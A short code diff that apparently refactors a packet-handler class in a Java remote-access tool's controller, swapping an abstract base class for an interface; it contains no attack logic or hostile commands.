@@ -6,7 +6,7 @@ import jrat.common.io.TransferData.State;
 import jrat.controller.Slave;
 
 
-public class Packet31CompleteServerDownload extends AbstractIncomingPacket {
+public class Packet31CompleteServerDownload implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
